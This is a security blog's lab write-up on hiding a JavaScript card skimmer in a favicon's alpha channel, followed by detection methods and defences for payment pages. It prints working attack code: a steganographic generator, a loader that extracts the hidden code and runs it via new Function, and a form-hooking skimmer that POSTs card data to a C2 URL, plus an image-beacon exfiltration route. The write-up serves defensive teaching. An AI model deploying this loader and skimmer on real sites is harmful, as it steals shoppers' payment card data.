---
title: "Favicon Trojan: Hiding JavaScript Skimmers Inside Images with Steganography"
slug: "steganography-favicon-skimming"
date: 2026-06-24
description: "A deep-dive into Lab 4 — how attackers embed fully functional JavaScript skimmers inside a site's favicon using steganographic encoding, bypassing script-focused security controls entirely."
categories: ["threat-intel"]
tags: ["steganography", "favicon", "canvas-api", "e-skimming", "javascript", "lab-writeup", "evasion", "data-exfiltration"]
author: "Sri Chinmai"
canonicalURL: "https://blog.pcioasis.com/posts/threat-intel/steganography-favicon-skimming/"
ShowToc: true
TocOpen: true
---

> **Educational Purpose Only.** This article and Lab 4 are strictly for educational purposes. Code examples demonstrate attack techniques to help security professionals understand and defend against them. Never use these techniques on systems you do not own.

## When Security Tools Stop Looking

Every serious JavaScript security control — Content Security Policy, Subresource Integrity, script-src allow-lists, WAF rules — is built around the same assumption: **the payload is in a script**.

Block untrusted scripts. Verify script hashes. Monitor network requests for `.js` files. That coverage is real and valuable.

But what if the malicious code is not in a script at all? What if it is stored as pixel data inside the favicon that has sat unchanged in your browser tab for years?

Lab 4 explores exactly this gap. The attack uses **HTML5 Canvas API steganography** to hide a working JavaScript credit card skimmer inside a standard `.ico` image file. The payload is never written to a `.js` file, never transmitted as text, never visible to a script scanner. It is extracted at runtime from pixel data — one character per alpha channel byte — and executed directly in the browser.

## The Steganography Concept

Steganography is the practice of hiding information inside an innocuous carrier. Unlike encryption (which hides the *content* of a message), steganography hides the *existence* of the message entirely.

Digital images store each pixel as four values: Red, Green, and Blue color channels (0–255), plus an Alpha channel that controls transparency (0 = invisible, 255 = fully opaque). For a favicon that appears fully opaque on screen, the alpha channel of every pixel is 255. Changing it to 254 or 200 is visually indistinguishable — the human eye cannot perceive single-digit alpha differences in a fully visible image.

The Lab 4 attack exploits this property:

- The Alpha channel of each pixel in the favicon stores exactly one byte of ASCII-encoded JavaScript.
- A NULL byte (0x00) marks the end of the payload.
- The original Red, Green, and Blue channels are untouched — the image looks identical.
- The favicon file passes every image-integrity check because it is a valid, parseable image.

## The Stego Generator

The attack chain begins offline, before the malicious favicon is ever deployed. The attacker uses a Node.js generator script to embed the skimmer payload into a clean favicon.

```javascript
// stego-generator/generator.js (simplified)
const Jimp = require('jimp');
const fs = require('fs');

async function embedPayload() {
  const payload = fs.readFileSync('./skimmer-payload.js', 'utf8');
  const image = await Jimp.read('./original-clean-favicon.png');

  const { width, height } = image.bitmap;
  const payloadBytes = Buffer.from(payload, 'ascii');

  // Scale up output if payload exceeds available pixels
  const requiredPixels = payloadBytes.length + 1; // +1 for null terminator
  const outputSize = Math.max(width, Math.ceil(Math.sqrt(requiredPixels)));

  const output = new Jimp(outputSize, outputSize);

  let i = 0;
  output.scan(0, 0, outputSize, outputSize, function (x, y, idx) {
    // Preserve original RGB if within source bounds
    if (x < width && y < height) {
      this.bitmap.data[idx]     = image.bitmap.data[idx];     // R
      this.bitmap.data[idx + 1] = image.bitmap.data[idx + 1]; // G
      this.bitmap.data[idx + 2] = image.bitmap.data[idx + 2]; // B
    }

    // Embed payload byte in alpha channel
    if (i < payloadBytes.length) {
      this.bitmap.data[idx + 3] = payloadBytes[i++]; // Alpha = payload byte
    } else if (i === payloadBytes.length) {
      this.bitmap.data[idx + 3] = 0x00; // NULL terminator
      i++;
    } else {
      this.bitmap.data[idx + 3] = 255; // Remaining pixels: fully opaque
    }
  });

  await output.writeAsync('./stego.png');
}
```

The result: a favicon that is pixel-for-pixel visually identical to the original, but whose alpha channel encodes a complete JavaScript program. The generator then converts this to `.ico` format and deploys it to the vulnerable site as `original-favicon.ico`.

## The Loader Script

The favicon is inert without something to read it. The attack requires one small, legitimate-looking script — `loader.js` — to be placed on the target page alongside the favicon reference. This is the only JavaScript file in the entire attack chain.

```javascript
// vulnerable-site/js/loader.js
(function () {
  const img = new Image();
  img.crossOrigin = "Anonymous";

  img.onload = function () {
    const canvas = document.createElement("canvas");
    canvas.width = img.width;
    canvas.height = img.height;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(img, 0, 0);

    const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
    const pixels = imageData.data; // Flat array: [R,G,B,A, R,G,B,A, ...]

    let code = "";
    for (let i = 3; i < pixels.length; i += 4) { // Every 4th byte = Alpha
      const byte = pixels[i];
      if (byte === 0) break; // NULL terminator
      code += String.fromCharCode(byte);
    }

    if (code.length > 0) {
      new Function(code)(); // Execute the extracted payload
    }
  };

  img.src = "/original-favicon.ico?" + Date.now(); // Cache-bust
  document.body.appendChild(img);
})();
```

What makes this loader particularly difficult to flag:

1. **It uses only standard browser APIs**: `Image`, `Canvas`, `getImageData` — all legitimate, all widely used in analytics and image processing scripts.
2. **The payload string is never in the source**: No `eval("...")`, no encoded string literals, no obvious obfuscation. The code arrives as pixel bytes at runtime.
3. **The request looks like an image load**: The network tab shows a GET request for a `.ico` file with a 200 response. Nothing suspicious.
4. **CSP `script-src` is not triggered**: The payload executes inside `new Function()` called from an already-trusted script context — the loader itself. If the loader's origin is trusted, the payload runs without triggering any CSP violations.

## The Hidden Payload

Once extracted from the favicon's alpha channel, this JavaScript executes in the page context with full access to the DOM:

```javascript
// skimmer-payload.js (embedded inside the favicon's alpha channel)
(function () {
  const C2_URL = window.location.hostname === "localhost"
    ? "http://localhost:3000/collect"
    : "https://c2.labs.pcioasis.com/lab4/c2/collect";

  function exfiltrate(data) {
    fetch(C2_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        source: "favicon-steganography",
        timestamp: new Date().toISOString(),
        page: window.location.href,
        ...data,
      }),
    }).catch(() => {});
  }

  function hookForm() {
    const form = document.querySelector("form");
    if (!form) return;

    form.addEventListener("submit", function (e) {
      const fields = {};
      new FormData(form).forEach((value, key) => {
        fields[key] = value;
      });
      exfiltrate(fields);
      // Does NOT call e.preventDefault() — the real submission continues normally
    });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", hookForm);
  } else {
    hookForm();
  }
})();
```

The skimmer attaches to the checkout form's `submit` event. When the user clicks "Pay Now", it fires first — silently capturing the card number, cardholder name, expiry, and CVV — and then lets the real submission proceed. The victim sees a normal checkout completion. No error, no redirect, no indication anything was captured.

## The C2 Server

Captured data lands at a Node.js Express C2 server:

```
POST /collect
Content-Type: application/json

{
  "source": "favicon-steganography",
  "timestamp": "2026-06-24T10:42:00.000Z",
  "page": "https://victim-shop.com/checkout",
  "card_number": "4111111111111111",
  "card_name": "Test User",
  "expiry": "12/28",
  "cvv": "123"
}
```

The server validates and sanitizes all fields (field-specific regex, control character stripping), writes each record as a dated JSON file to a `stolen-data/` directory, and appends to a rotating master log. A separate attacker dashboard at `/stolen` renders the captured cards in real time, auto-refreshing every five seconds.

The C2 also supports an image beacon fallback:

```
GET /collect?data=<base64-encoded-JSON>
```

This returns a 1×1 transparent GIF — so the exfiltration request appears in the network tab as an image load, not a POST to an API endpoint.

## Why This Bypasses Common Defenses

| Defense | Why it fails here |
|---|---|
| `script-src` CSP | Payload executes from within a trusted inline script, not from an external script URL |
| Subresource Integrity (SRI) | SRI applies to `<script src>` and `<link rel="stylesheet">` — not to image files |
| WAF JavaScript signature rules | The favicon is a binary image file; WAF rules for `.js` payloads never inspect it |
| Static code analysis / SAST | Scanners run against `.js` files in the repository — the payload does not exist as a `.js` file |
| File extension allow-lists | `.ico` is a permitted image type everywhere; blocking it breaks the favicon |
| Antivirus / malware scanner | Scanning the favicon as an image finds no signatures; there are no executable opcodes in the file |

What *can* detect this:

- **Runtime Canvas API monitoring**: Hooking `CanvasRenderingContext2D.getImageData` and inspecting what the caller does with the result. Browser security extensions and some EDR products implement this.
- **Behavioral analysis**: Monitoring for `new Function()` calls with long dynamically-assembled strings.
- **Image integrity checks**: Computing a hash of the favicon at deployment time and alerting on changes. Simple, effective, rarely done.
- **CSP `connect-src`**: Won't prevent the payload from running, but restricts where `fetch()` can send data — the C2 domain must be explicitly allowed.
- **Strict SRI on all resources**: Doesn't help here directly, but signals a security posture that also includes monitoring.

## The Attack Infrastructure

The full lab runs in two Docker containers on the same internal network:

- **`lab4-vulnerable-site`** (nginx, port 8084): Serves the checkout page, the malicious `original-favicon.ico`, and `loader.js`.
- **`lab4-c2-server`** (Node.js Express, port 3004): Receives exfiltrated card data, stores it, and serves the attacker dashboard.

The vulnerable site HTML wires everything together with two lines:

```html
<link rel="icon" type="image/x-icon" href="original-favicon.ico">
<script src="js/loader.js"></script>
```

No other changes to the site are needed. An attacker who can replace the favicon file and add one script tag has everything required to harvest cards from every checkout submitted while the malicious favicon is in place.

## Why Favicons Are a Blind Spot

Favicons are loaded by the browser automatically on every page visit, cached aggressively, and rarely audited. They are served from the same domain as the application (so same-origin restrictions do not block canvas pixel reads). They are small files that most monitoring pipelines ignore. They are expected to change infrequently — meaning a file-integrity monitoring system that checks JavaScript will not typically be configured to alert on favicon changes.

The Sansec research group identified real-world skimmer campaigns using favicon-based delivery as early as 2020. The `lord.js` and related campaigns loaded skimmers from malicious favicon endpoints specifically because image URLs attracted less scrutiny than script URLs.

## Defences for Payment Page Operators

**1. File Integrity Monitoring on All Deployed Assets**
Hash every file in the web root at deploy time — including `.ico`, `.png`, `.svg`. Alert on any change outside a deployment pipeline. This is the single most reliable control against this specific technique.

**2. Content Security Policy `connect-src`**
Even if the skimmer runs, `connect-src` restricts where `fetch()` and `XMLHttpRequest` can send data. A strict `connect-src 'self'` blocks exfiltration to the C2 domain.

```http
Content-Security-Policy: connect-src 'self' https://your-payment-processor.com
```

**3. Subresource Integrity on Scripts**
While SRI does not cover image files, applying it to all `<script>` tags at minimum means the loader script itself cannot be silently replaced:

```html
<script src="/js/loader.js"
        integrity="sha384-..."
        crossorigin="anonymous"></script>
```

If the `loader.js` hash changes, the browser refuses to execute it.

**4. Restrict `crossOrigin` Image Loads**
The Canvas API can only read pixel data from images loaded with `crossOrigin="Anonymous"` and served with an appropriate CORS header. Removing CORS headers from the favicon endpoint prevents third-party pages from harvesting its pixel data — though this does not protect against a compromised same-origin loader.

**5. Runtime Application Self-Protection (RASP)**
Browser-side RASP hooks can intercept `getImageData` calls at runtime and monitor what code does with the result. This is the most capable detection surface for this attack but requires client-side instrumentation.

**6. PCI DSS Requirement 6.4.3**
PCI DSS v4.0 Requirement 6.4.3 mandates that all payment-page scripts are inventoried, authorized, and integrity-checked. Compliance here directly prevents this category of attack — an unregistered `loader.js` added to the checkout page would appear as an unauthorized script in a compliant inventory audit.

## Summary

The steganography favicon attack demonstrates that e-skimming does not require modifying a single line of JavaScript in a repository. A change to one image file and the presence of a small, inconspicuous loader script is sufficient to harvest every card submitted through a checkout page.

The attack chain works because:

- **Images are not treated as code carriers** by most security tooling.
- **Canvas API pixel access is legitimate** and widely used.
- **Favicons are trusted by default** — same-origin, cached, rarely audited.
- **The payload never exists as readable text** in any file on disk or in any network response that looks like a script.

Effective defence requires looking beyond script files: monitoring *all* deployed assets for unexpected changes, enforcing strict `connect-src` to limit exfiltration even when a skimmer runs, and treating the checkout page as a high-value attack surface where every resource — image or script — is subject to integrity checking.
